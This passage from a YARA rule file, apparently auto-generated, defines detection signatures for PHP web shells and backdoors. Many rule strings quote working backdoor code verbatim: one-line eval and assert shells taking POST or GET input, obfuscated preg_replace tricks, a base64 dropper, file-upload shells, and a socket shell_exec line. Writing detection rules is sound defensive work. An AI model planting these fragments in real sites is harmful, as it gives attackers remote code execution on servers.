      $s19 = "elseif (@is_link($GLOBALS['cwd'] . $dirContent[$i])) $dirs[] = array_merge($tmp, array('type' => 'link'));" fullword ascii
      $s20 = "$notallow = array($me, \".htaccess\", \"error_log\", \"_vti_inf.html\", \"_private\", \"_vti_bin\", \"_vti_cnf\", \"_vti_log\", " ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*) and all of them
}

rule sig_3d2c16ba66c49d6776818b38d56795304adf6f8c
{
   meta:
      description = "php17 - file 3d2c16ba66c49d6776818b38d56795304adf6f8c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bc4da237fd7e9d00ea56ae4842fc9f4a9bc2da44c0bef7c0ccaafc377a60f9ff"
   strings:
      $x1 = "elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $x2 = "elseif(function_exists('system')){@ob_start();@system($cmd);$ret = @ob_get_contents();@ob_end_clean();}" fullword ascii
      $s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0 - Edited By KingDefacer</title><meta http-equiv=\"Conte" ascii
      $s4 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - FaTaL Shell v1.0 - Edited By KingDefacer</title><meta http-equiv=\"Conte" ascii
      $s5 = "document.reqs.submit();\">| Shell </a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='viewer';" fullword ascii
      $s6 = "$act=array('viewer','editor','upload','shell','phpeval','download','delete','deletedir');//here added new actions" fullword ascii
      $s7 = "elseif(@is_resource($f = @popen($cmd,\"r\"))){$ret = \"\";while(!@feof($f)) { $ret .= @fread($f,1024); }@pclose($f);}" fullword ascii
      $s8 = "if(function_exists('exec')){@exec($cmd,$ret);$ret = join(\"\\n\",$ret);}" fullword ascii
      $s9 = "elseif(function_exists('shell_exec')){$ret = @shell_exec($cmd);}" fullword ascii
      $s10 = "<a href=\"http://alturks.com\">COPYRIGHT 2010 - Edited By KingDefacer <?=$version;?></a></td></tr></table></tr></td></table><?=$" ascii
      $s11 = "<a href=\"http://alturks.com\">COPYRIGHT 2010 - Edited By KingDefacer <?=$version;?></a></td></tr></table></tr></td></table><?=$" ascii
      $s12 = "| Edit File</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='upload';document.reqs.dir.value='<?=$dir;?>';" fullword ascii
      $s13 = "<a href=\"#\" onclick=\"document.reqs.action.value='shell';document.reqs.dir.value='<?=$dir;?>';" fullword ascii
      $s14 = "<form name='reqs' method='POST'><input name='action' type='hidden' value=''><input name='dir' type='hidden' value=''> <input na" fullword ascii
      $s15 = "if(!isset($_POST['filename'])) $uploadfile = $dirupload.basename($_FILES['file']['name']); else " fullword ascii
      $s16 = "n'].\" -o \".$_POST['filename'].\"\");break;}}}?> " fullword ascii
      $s17 = "document.reqs.submit();\">| Upload File</a></td><td><a href=\"#\" onclick=\"document.reqs.action.value='phpeval';" fullword ascii
      $s18 = "$content.=\"<table cellSpacing=0 border=1 style=\\\"border-color:black;\\\" cellPadding=0 width=\\\"100%\\\">\";" fullword ascii
      $s19 = "<-Back |</a></td><td><a href=\"#\" onclick=\"history.forward();\"> Next->|</a></td></tr></table></td></tr></table><br>" fullword ascii
      $s20 = "(@ini_get('safe_mode')==\"1\" ? $safe_mode=\"ON\" : $safe_mode=\"OFF(Rootla_Beni:)\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_931285ba4fd2a203d8976faee8d74bb050b554b7
{
   meta:
      description = "php17 - file 931285ba4fd2a203d8976faee8d74bb050b554b7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7a51ae5b0eccbc916538cba88e07324e757b610da72c5ee7a1f9a06aee0a2466"
   strings:
      $s1 = "@fputs(fopen(base64_decode('cGx1Z2luX20ucGhw'),w),base64_decode('PD9waHAgQGFzc2VydCgkX1BPU1RbJ2NtZCddKTs/Pg=='));" fullword ascii
      $s2 = "header('HTTP/1.1 404');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8e5f7f6523891a5dcefcbb1a79e5bbe9
{
   meta:
      description = "php17 - file 8e5f7f6523891a5dcefcbb1a79e5bbe9.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8925a8247c1f8e7b9fac4a1f6f0c8e94bff3a3b24f8c58b73d9d79e91fb40ef7"
   strings:
      $s1 = "if(isset($_GET['install'])){" fullword ascii
      $s2 = "echo \"<form action='' method='post' enctype='multipart/form-data' name='uper' id='uper'><input type='file' name='file'><input n" ascii
      $s3 = "me='_upl' type='submit' id='_upl' value='up'></form>\";if($_POST['_upl']=='up') {if(@copy($_FILES['file']['tmp_name'],$_FILES['f" ascii
      $s4 = "le']['name'])) {echo '<b>up!!!</b><br><br>';}}" fullword ascii
      $s5 = "echo \"<form action='' method='post' enctype='multipart/form-data' name='uper' id='uper'><input type='file' name='file'><input n" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_25a80172c087537c4ddc92614ba8ada1f9ef4ab1
{
   meta:
      description = "php17 - file 25a80172c087537c4ddc92614ba8ada1f9ef4ab1.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a3c7337a1dd877224039f8b66e9e99f17b2aa30494c1ad1b6c3910dd82d28776"
   strings:
      $x1 = "$key .= '<form id=\"form_' . md5($file) . '\" target=\"iform_' . md5($file) . '\" action=\"http://www.shelldetector.com/api/?ta" fullword ascii
      $x2 = "md5($file) . '\" name=\"iform_' . md5($file) . '\" src=\"http://www.shelldetector.com/api/loader.html\" />\"></iframe>';" fullword ascii
      $x3 = "$this->fingerprints = unserialize(base64_decode(file_get_contents('https://raw.github.com/emposha/PHP-Shell-Detector/maste" fullword ascii
      $x4 = "$server_version = file_get_contents('https://raw.github.com/emposha/PHP-Shell-Detector/master/version/db', 0, $context);" fullword ascii
      $x5 = "$server_version = file_get_contents('https://raw.github.com/emposha/PHP-Shell-Detector/master/version/app', 0, $context);" fullword ascii
      $x6 = "$content = file_get_contents('https://raw.github.com/emposha/PHP-Shell-Detector/master/shelldetect.db', 0, $context);" fullword ascii
      $x7 = "$server_version = file_get_contents('http://www.shelldetector.com/api/', 0, $context);" fullword ascii
      $x8 = "self::output('<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"><" ascii
      $x9 = "* Web Shell Detector is released under the MIT License <http://www.opensource.org/licenses/mit-license.php>" fullword ascii
      $x10 = "* https://github.com/emposha/PHP-Shell-Detector" fullword ascii
      $x11 = "$key .= '<form id=\"form_' . md5($file) . '\" target=\"iform_' . md5($file) . '\" action=\"http://www.shelldetector.com/api/?tas" ascii
      $x12 = "* Unpacking function, main idea taken from http://www.tareeinternet.com/" fullword ascii
      $s13 = "$this->fingerprints = unserialize(base64_decode(file_get_contents('https://raw.github.com/emposha/PHP-Shell-Detector/master/shel" ascii
      $s14 = "$postdata = http_build_query(array('task' => 'submit', 'ver' => '2', 'code' => base64_encode(file_get_contents($filename" fullword ascii
      $s15 = "$key .= '<form id=\"form_' . md5($file) . '\" target=\"iform_' . md5($file) . '\" action=\"?task=sendfile\" method=\"post\">';" fullword ascii
      $s16 = "if (openssl_public_encrypt($base64_content, $crypted_data, base64_decode($this->_public_key))) {" fullword ascii
      $s17 = "$this->fingerprints = unserialize(base64_decode(file_get_contents('shelldetect.db', 0, $context)));" fullword ascii
      $s18 = "$key .= '<div id=\"wrapform_' . md5($file) . '\" class=\"hidden\"><iframe border=\"0\" scrolling=\"no\" class=\"hidden\" id=\"if" ascii
      $s19 = "self::output($this->t('File limit reached, scanning process stopped.'));" fullword ascii
      $s20 = "$content_temp = $matches[1] . '(' . str_replace('$' . $variable[1], $content_match[1], $matches[2]);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and all of them
}

rule sig_5138a1c392c4995ff38548575bba9e679b2d7a54
{
   meta:
      description = "php17 - file 5138a1c392c4995ff38548575bba9e679b2d7a54.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "46d038dd90a471204c47f65bcb05b80a8b0a1e2a48f33afa2b842bad70d8093f"
   strings:
      $s1 = "<?php ($b = $_POST['c']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($b)', 'add');?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AbstractAdminSidebar
{
   meta:
      description = "php17 - file AbstractAdminSidebar.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e085f9144c17126aa743561f8946e5b6548194d9e110527a0422488205696da5"
   strings:
      $s1 = "* Method used to define your sidebar menu groups and items" fullword ascii
      $s2 = "$sidebar->add($this->extendWith($sidebar->getMenu()));" fullword ascii
      $s3 = "* @internal param Guard $guard" fullword ascii
      $s4 = "* @param Authentication $auth" fullword ascii
      $s5 = "* @param Menu $menu" fullword ascii
      $s6 = "* @var Authentication" fullword ascii
      $s7 = "* @return Menu" fullword ascii
      $s8 = "abstract public function extendWith(Menu $menu);" fullword ascii
      $s9 = "public function handle(BuildingSidebar $sidebar)" fullword ascii
      $s10 = "public function __construct(Authentication $auth)" fullword ascii
      $s11 = "use Modules\\Core\\Events\\BuildingSidebar;" fullword ascii
      $s12 = "use Maatwebsite\\Sidebar\\SidebarExtender;" fullword ascii
      $s13 = "$this->auth = $auth;" fullword ascii
      $s14 = "namespace Modules\\Core\\Sidebar;" fullword ascii
      $s15 = "use Modules\\User\\Contracts\\Authentication;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      8 of them
}

rule sig_22d8730308fea62756d5f63806b7f248ed762c23
{
   meta:
      description = "php17 - file 22d8730308fea62756d5f63806b7f248ed762c23.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "24f3622283966c50ac8c894993148e638e7865a969df307c37a6c7eebf66e62c"
   strings:
      $s1 = "<?php preg_replace(\"/faith/e\",$_POST['faith'],\"faith\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_923074b986069df74d35aac27e80f2b0afaf0a9c
{
   meta:
      description = "php17 - file 923074b986069df74d35aac27e80f2b0afaf0a9c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5f01d8d780750087761dc0d7916fc9e553a984a720f683c8ed17b01e50b93a40"
   strings:
      $s1 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_" ascii
      $s2 = "part/form-data\"><input name=\"upfile\" type=\"file\"><input type=\"submit\" value=\"ok\"></form><?php }?>" fullword ascii
      $s3 = "if($_GET[\"hackers\"]==\"2b\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if(!file_" ascii
      $s4 = "ILES[\"upfile\"][\"name\"])){ copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); }}?><form method=\"post\" " ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9766b999787fdcedd2e95738c5f7d1499310a237
{
   meta:
      description = "php17 - file 9766b999787fdcedd2e95738c5f7d1499310a237.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "81388c8cc99353cdb42572bb88df7d3bd70eefc748c2fa4224b6074aa8d7e6a2"
   strings:
      $s1 = "/* https://blog.sucuri.net/2014/04/php-callback-functions-another-way-to-hide-backdoors.html */" fullword ascii
      $s2 = "@array_diff_ukey(@array((string)$_REQUEST['password']=>1), @array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['" ascii
      $s3 = "login']);" fullword ascii
      $s4 = "@array_diff_ukey(@array((string)$_REQUEST['password']=>1), @array((string)stripslashes($_REQUEST['re_password'])=>2),$_REQUEST['" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_9019138d51925385bff040a239f8ee1713fc81bd
{
   meta:
      description = "php17 - file 9019138d51925385bff040a239f8ee1713fc81bd.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "768c8069e91c16ef89004cd521e5edb57284fd32e394accef26005ad90f50e1c"
   strings:
      $s1 = "<?php@eval($_GET['p'])" fullword ascii
      $s2 = "'pouet'.'pif' . 'pouet' . \"lol\" .\"kwainkwain\"" fullword ascii
      $s3 = "$func=\"test\";$b374k=$func('$x', 'ev'.'al')" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_5c9c52462130207b672198fe64921e9d
{
   meta:
      description = "php17 - file 5c9c52462130207b672198fe64921e9d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "78c1eb4573595da904673fd697b38b5db66404fd0acf3aed89daddb86cfb43d5"
   strings:
      $x1 = "* @copyright   Copyright (c) 2011 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $x2 = "echo \"<title>Evoo</title><center><div id=q>lastc0de@Outlook.com<br><font size=2>Thx To CodersLeet - AgencyCaFc - IndoXploit <" fullword ascii
      $s3 = "echo 'It looks like you have an invalid PHP version. Magento supports PHP 5.2.0 or newer';" fullword ascii
      $s4 = "body{background-color:#000000;color:#ffffff;}</style><font style=\"Arial\"><font color=\"green\"><center><b><br><br>'.php_uname(" ascii
      $s5 = "echo '<title>Lastc0de@outlook.com | Php Backdoor</title><style>" fullword ascii
      $s6 = "echo \"<title>Evoo</title><center><div id=q>lastc0de@Outlook.com<br><font size=2>Thx To CodersLeet - AgencyCaFc - IndoXploit <st" ascii
      $s7 = "// check request could be processed by API2" fullword ascii
      $s8 = "post\" enctype=\"multipart/form-data\" name=\"uploader\" ></center><br><center><input type=\"file\" name=\"file\" size=\"50\"><i" ascii
      $s9 = "// if no adapters found in aliases - find it by default, by code" fullword ascii
      $s10 = "style>body{overflow:hidden;background-color:black}#q{font:40px impact;color:white;position:absolute;left:0;right:0;top:43%}\";" fullword ascii
      $s11 = "].'</a></b><br><br></center>'; }else {echo '<b>'.$_FILES['file']['name'].' Not Uploaded.</b>';}}}" fullword ascii
      $s12 = "if (in_array($apiAlias, Mage_Api2_Model_Server::getApiTypes())) {" fullword ascii
      $s13 = "$mageFilename = getcwd() . '/app/Mage.php';" fullword ascii
      $s14 = "Mage::app()->loadAreaPart(Mage_Core_Model_App_Area::AREA_GLOBAL, Mage_Core_Model_App_Area::PART_EVENTS);" fullword ascii
      $s15 = "Mage::app()->loadAreaPart(Mage_Core_Model_App_Area::AREA_ADMINHTML, Mage_Core_Model_App_Area::PART_EVENTS);" fullword ascii
      $s16 = "$adapterCode = $server->getAdapterCodeByAlias($apiAlias);" fullword ascii
      $s17 = "if (version_compare(phpversion(), '5.2.0', '<')) {" fullword ascii
      $s18 = "$apiAlias = Mage::app()->getRequest()->getParam('type');" fullword ascii
      $s19 = "// emulate index.php entry point for correct URLs generation in API" fullword ascii
      $s20 = "// query parameter \"type\" is set by .htaccess rewrite rule" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule sig_9e87c758d2b493e75ec357444bfb0e50d3cdfb93
{
   meta:
      description = "php17 - file 9e87c758d2b493e75ec357444bfb0e50d3cdfb93.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c37e880c53295c6674199ba51a1d2304e65a9d981b18108103c5f136a47c5648"
   strings:
      $s1 = "<?php eval($_POST[cmd])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0777d5c17d4066b82ab86dff8a46af6f
{
   meta:
      description = "php17 - file 0777d5c17d4066b82ab86dff8a46af6f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "92fe881701c478d4de012df1a25ec5a0444adb3a07d60773b455052521bba91c"
   strings:
      $x1 = "YU0xcDd1MVZiYmxjRmRIa3kxVDllS2NFWnpHQS8vc2I1WHJrNzBPK0hqZTlWL2NqNDlIWkVDbHFNc3hDdnM5RS9lLzZBcy8zNUo4VXhySG9HbFNyQ1JoUWFP" fullword ascii
      $x2 = "U2R6SEUrb29LOG9iMW41UklHemVzeHVQK1kraDlFOUJEajVmS1d3RnVGVjlJVzhTS2RoUUNRRnRGcUZ2MkpmTFZmMWtKb3F3b1JvQW8wdWR2WTk4VnY4OFhZ" fullword ascii
      $x3 = "ZWs5YXZRWmVPSTVlajJzVXhNbmdubUUvSWsxMFkrZDdWbkpuUytBQ2Znei9uQkllOGJEckoxVzNJTEZaUGpYUmNTRzZ5ZkJlTmxiZ0tlRWtTUVdDVldHQi9i" fullword ascii
      $x4 = "TytIamU5Vi9jajQ5SFpFQ2xxTXN4Q3ZzOUUvZS82QXMvMzVKOFV4ckhvR2xTckNSaFFhT0J4Q0ZhNW14QUczTnNJUzRmaHdLLzRzL05lK0gra2M5L2gvZmc5" fullword ascii
      $x5 = "Q1FGdEZxRnYySmZMVmYxa0pvcXdvUm9BbzB1ZHZZOThWdjg4WFlaTHpvaUl1R083eDliVWZyOHRUNkxFSGhxaHlPbEpPenNXWjBQRjhTOEV1VExQWHBDcFJp" fullword ascii
      $x6 = "QUFpZnBucHhleUZqTjRMK0pYM0R3L2h5YTRSVmhVN21BT0szOFYzdEh0MUQxUnZ0L1NWaUdremtia20wRmVRSXFuZklKVmtESTBMdFljVlRhMHhkbDRuNU94" fullword ascii
      $x7 = "NklIeHZqNVY3MDhnYnVtak4wY0JhY3dwTk9tRDZBK3JWVGFFN202alo1RTJzRFZubDE5ajdIdURWTnRVZnJ3WVRVRkpkekp1T0NMTlB0WjQzaFl5NkRWeUhP" fullword ascii
      $x8 = "KzdNMXZ0cWtKY3kvREVUMC9UZEJ5eHBRMHh2bS9MNE5ydXNaLyt6RXZNL2lNRnk3Z3J3Nk5sMjVuRkNlZmVORlZJM3prc2FGZlpJS0lvMUNVZ055K3NzNDZG" fullword ascii
      $x9 = "Tm5ZSlk4WlJrM21QWlBucEVmbndVQWs0RTBUSWo4dmNHVUZMdlRsOGRaaEhTdFZVeGpsbUwxT0NuR0dFVGtXRHNyUVd2ZnptTEdtWVZWcFlDR1NpQUlVbGFm" fullword ascii
      $x10 = "VGVZMlRwVHkrckNzNzRWUGhJQSsxelY0Y0ZDTThicjBXU2h5ZEJyRlFLU3FZNTNVTCtZK0xmOUd5aWE3SDR5eGJZQUpqY3YydjVaOWJuSkhWWG5rOTNLazhX" fullword ascii
      $x11 = "ZjlmZDkuPSJcMTQ0IjskZjZkNGVlMWMuPSJceDY1Ijskd2Y0NTBhNDIuPSJcMTU2Ijskd2Y0NTBhNDIuPSJcMTY0IjskdGRlZjlmZDkuPSJceDY1Ijskd2Y0" fullword ascii
      $x12 = "a0dqTklkVk53YVNZK25JTXpIT2VaTm1Qb0UzWGVubzlGaUEwWHovY24ydC9kV2J5dldnbFdaZlFpQVYxRGQxSDlHQUlrS2F1SkJvaTlIYk5oVm53dklrRS9T" fullword ascii
      $x13 = "NjUiOyRlOWRkYjg4MD0iXHg2NyI7JHU5M2RhOGVjPSJceDczIjskd2UxZWMzM2M9Ilx4NzMiOyR3ZjQ1MGE0Mj0iXDE0NiI7JGY2ZDRlZTFjPSJcMTYwIjsk" fullword ascii
      $x14 = "eDI4IixfX0ZJTEVfXyk7QGV2YWwoJHU5M2RhOGVjKCR3ZWY0N2MyNygkZjZkNGVlMWMoIlx4MmZceDVjXHgyOFx4NWNceDIyXDU2XDUyXDEzNFx4MjJceDVj" fullword ascii
      $x15 = "bXpOSml0dnBXeTFrTVphZXF2MnhCVHovNEhIYk43bHk2R2RmT1FlYmxEancxOUxDNjZBeHU2NlBNN0xzQjJWUkJaY01JYy9xbERQdUZ1U0dvWGNlbldlMU1L" fullword ascii
      $x16 = "MlhnTWxrTG5DU3lWMVVGNzA3bHpwdmVMd21NaFZDa3I4VmZOejArR1YyK0g0ZVJjZUNtck9oT3c0d1ZlUWJYNHEzalJNQWNZR0dZRjZlRGkwZ3E1MVFOcGNn" fullword ascii
      $x17 = "MTg5ODQ5Mi49IlwxNjMiOyRmNmQ0ZWUxYy49IlwxNDUiOyR0ZGVmOWZkOS49Ilx4NzMiOyR3ZWY0N2MyNy49IlwxNDEiOyR3ZjQ1MGE0Mi49Ilx4NmMiOyRx" fullword ascii
      $x18 = "dktjVGp0WkpuSkRHMFlmQWRXK2c3V3ZEcjlDdU84OGF4WEdFRUVhb2VVNjB2bVVPL1BveXFjeW5RYnhnd2s3bVd1WmlvWUVFMFJXeEhzdXYycVBVK3JUeCtH" fullword ascii
      $x19 = "ZjQ1MGE0Mi49Ilx4NjUiOyRlOWRkYjg4MC49IlwxNTYiOyRmNmQ0ZWUxYy49Ilx4NjciOyR3ZTFlYzMzYy49IlwxMzciOyRuMTg5ODQ5Mi49IlwxNDUiOyR3" fullword ascii
      $x20 = "LyszOE9pLytsdGx2bmM0ZkRxdmxuRi9BanFjRDFyWXBuZThIcC9wNVpKM0twVHM0OXZQTFpNai9IUVozQzVJVnRuWU41eFBWNC9Qd1ZQUURPSmhUVmpISTVD" fullword ascii
   condition:
      uint16(0) == 0x3c20 and filesize < 30KB and
      1 of ($x*)
}

rule AbstractHelper
{
   meta:
      description = "php17 - file AbstractHelper.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "38c701f4489e2d3fe78b550288ca48482e89d6964c7822bf37c2f9b9c53b52ba"
   strings:
      $x1 = "* @copyright  Copyright (c) 2005-2015 Zend Technologies USA Inc. (http://www.zend.com)" fullword ascii
      $x2 = "* http://framework.zend.com/license/new-bsd" fullword ascii
      $s3 = "* @license    http://framework.zend.com/license/new-bsd     New BSD License" fullword ascii
      $s4 = "* ----------------------------------------------------------------------------------" fullword ascii
      $s5 = "* to license@zend.com so we can send you a copy immediately." fullword ascii
      $s6 = "* based on @author ZF1 Zend_View_Helper_Placeholder_Container_Standalone" fullword ascii
      $s7 = "* with this package in the file LICENSE.txt." fullword ascii
      $s8 = "* @method Container setPostfix(string $postfix)" fullword ascii
      $s9 = "* @method string getWhitespace(string|int $indent)" fullword ascii
      $s10 = "* @method void captureStart($type = Container::APPEND, $key = null)" fullword ascii
      $s11 = "* IteratorAggregate: get Iterator" fullword ascii
      $s12 = "* Registry key under which container registers itself" fullword ascii
      $s13 = "* Set container on which to operate" fullword ascii
      $s14 = "* @method string|int getIndent()" fullword ascii
      $s15 = "* @method string getPostfix()" fullword ascii
      $s16 = "* @method string getPrefix()" fullword ascii
      $s17 = "* @method string getSeparator()" fullword ascii
      $s18 = "* ArrayAccess: offsetGet" fullword ascii
      $s19 = "* @method Container setSeparator(string $separator)" fullword ascii
      $s20 = "* This source file is subject to the new BSD license that is bundled" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule sig_1bc134acecdf6e441eb53718b93a3cda81c2b453
{
   meta:
      description = "php17 - file 1bc134acecdf6e441eb53718b93a3cda81c2b453.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "da6af9a4a60e3a484764010fbf1a547c2c0a2791e03fc11618b8fc2605dceb04"
   strings:
      $x1 = "| ip server :&nbsp;<a style='text-decoration: none; color: #FF0000;' href='http://whatismyipaddress.com/ip/$ips' target='_blank" fullword ascii
      $x2 = "href='http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$os&filter_exploit_text=&filter_author=&" fullword ascii
      $x3 = "echo \"<tr><td><b>twitter :</b> <a  target='_blank'href='https://twitter.com/#!/al_swisre'>al_swisre</a></td></tr>\";" fullword ascii
      $x4 = "href='http://www.google.com.sa/search?hl=ar&safe=active&client=firefox-a&hs=9Xx&rls=org.mozilla%3Aar%3Aofficial&q=$os&oq=$os&aq" fullword ascii
      $x5 = "<div class=\"hedr\"> <img src=\"http://im11.gulfup.com/2012-02-03/1328267135241.png\" align=\"left\" alt=\"Saudi Shell\" > <" fullword ascii
      $x6 = "$read = @file_get_contents(\"http://s92443018.onlinehome.us/cgi-bin/host.php?$ips\");" fullword ascii
      $x7 = "$r3ad = @file_get_contents(\"http://aruljohn.com/track.pl?host=$ips\") ;" fullword ascii
      $x8 = "echo \"&nbsp;&nbsp;&nbsp;[ <a style='text-decoration: none; color: #003300; text-shadow: 2px 2px 7px #003300;   ' target='_blank" ascii
      $s9 = "$url_shell  = 'http://64.15.137.117/~google/cgi-bin/python.zip';  /// python" fullword ascii
      $s10 = "$query = mysql_query(\"SELECT * FROM tblhosting where username = 'root' or 'admin' or 'administrator'\");" fullword ascii
      $s11 = "<td><b>And :</b> Mr.Black  - IraQiaN-r0x - Oxygen - locked - n4ss  .. and  All members of v4-team.com </td></tr></div>\";" fullword ascii
      $s12 = "fputs($sockfd , \"\\n\" . shell_exec($command) . \"\\n\\n\");" fullword ascii
      $s13 = "ss='foter'>E-m4il : <a href='#'>oy3@hotmail.com</a></b>|<b class='foter'>r57 shell : <a target='_blank' href='http://r57.gen.tr'" ascii
      $s14 = "echo \"</td></tr></table></div> |<b class='foter'>Progr4m3r by <a href='$pg?sws=ab'>al-swisre Edited: r57.gen.tr</a></b>|<b clas" ascii
      $s15 = "[<a href=\"?sws=ms&op=sh\"> Inject shell</a>]" fullword ascii
      $s16 = "$wp2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/blog/wp-config.php\";" fullword ascii
      $s17 = "echo \"Your ip :&nbsp;<font ><b><a style='text-decoration: none; color: #FF0000;' href='http://whatismyipaddress.com/ip/$ip' tar" ascii
      $s18 = "| ip server :&nbsp;<a style='text-decoration: none; color: #FF0000;' href='http://whatismyipaddress.com/ip/$ips' target='_blank'" ascii
      $s19 = "$wh2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/support/configuration.php\";" fullword ascii
      $s20 = "<a href='sym/root/home/\".$user['name'].\"/public_html' target='_blank'>symlink </a>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule php17_Array
{
   meta:
      description = "php17 - file Array.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f0ecf0214ee28d5281639ab9ef9a79194e6002d66e47aad3c16347caebcda37c"
   strings:
      $s1 = "if ($pair['key'] instanceof Twig_Node_Expression_Constant && ctype_digit((string) $pair['key']->getAttribute('value'" fullword ascii
      $s2 = "$key = new Twig_Node_Expression_Constant(++$this->index, $value->getLine());" fullword ascii
      $s3 = "* @param Twig_Compiler A Twig_Compiler instance" fullword ascii
      $s4 = "* Compiles the node to PHP." fullword ascii
      $s5 = ")) && $pair['key']->getAttribute('value') > $this->index) {" fullword ascii
      $s6 = "public function addElement(Twig_Node_Expression $value, Twig_Node_Expression $key = null)" fullword ascii
      $s7 = "$this->index = $pair['key']->getAttribute('value');" fullword ascii
      $s8 = "foreach ($this->getKeyValuePairs() as $pair) {" fullword ascii
      $s9 = "public function getKeyValuePairs()" fullword ascii
      $s10 = "// we compare the string representation of the keys" fullword ascii
      $s11 = "* This file is part of Twig." fullword ascii
      $s12 = "// to avoid comparing the line numbers which are not relevant here." fullword ascii
      $s13 = "->subcompile($pair['key'])" fullword ascii
      $s14 = "public function hasElement(Twig_Node_Expression $key)" fullword ascii
      $s15 = "public function compile(Twig_Compiler $compiler)" fullword ascii
      $s16 = "if ((string) $key == (string) $pair['key']) {" fullword ascii
      $s17 = "if ($pair['key'] instanceof Twig_Node_Expression_Constant && ctype_digit((string) $pair['key']->getAttribute('value')) && $pair[" ascii
      $s18 = "array_push($this->nodes, $key, $value);" fullword ascii
      $s19 = "$compiler->raw('array(');" fullword ascii
      $s20 = "foreach (array_chunk($this->nodes, 2) as $pair) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      8 of them
}

rule a9b654f00c9d574dc9020ce75e344272
{
   meta:
      description = "php17 - file a9b654f00c9d574dc9020ce75e344272.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "c334d98c7e2196f598321a3e357997390eaf844e6c7b337c24bc40a332f018ad"
   strings:
      $x1 = "if ( is_readable($current_dir.$file) && (strpos(\".wav#.mp3#.mid#.avi#.mov#.mpeg#.mpg#.rm#.iso#.bin#.img#.dll" fullword ascii
      $x2 = "<form name=\\\"login_form\\\" action=\\\"\".$path_info[\"basename\"].\"\\\" method=\\\"post\\\" target=\\\"_parent\\\">" fullword ascii
      $x3 = "<form name=\\\"buymeabeer_form\\\" action=\\\"https://www.paypal.com/cgi-bin/webscr\\\" method=\\\"post\\\">" fullword ascii
      $x4 = "$fr1['ExecCmd'] = 'Executer une Commande';" fullword ascii
      $s5 = "$blockKeys = array('_SERVER','_SESSION','_GET','_POST','_COOKIE','charset','ip','islinux','url','url_info','doc_root','fm_se" fullword ascii
      $s6 = "$en['ExecCmd'] = 'Execute Command';" fullword ascii
      $s7 = "$fr3['ExecCmd'] = 'Executer Commande';" fullword ascii
      $s8 = "<form name=\\\"login_form\\\" action=\\\"\".$path_info[\"basename\"].\"\\\" method=\\\"post\\\">" fullword ascii
      $s9 = "if ( is_readable($current_dir.$file) && strlen($dir_entry[\"ext\"]) && (strpos(\".exe#.com#.sh#.bat#\", $dir_ent" fullword ascii
      $s10 = "<input type=button onclick=\\\"execute_cmd()\\\" value=\\\"\".et('ExecCmd').\"\\\">" fullword ascii
      $s11 = "<td align=center><a href=\\\"javascript:execute_file('\".addslashes($file).\"')\\\">\".et('Exec').\"</a>\";" fullword ascii
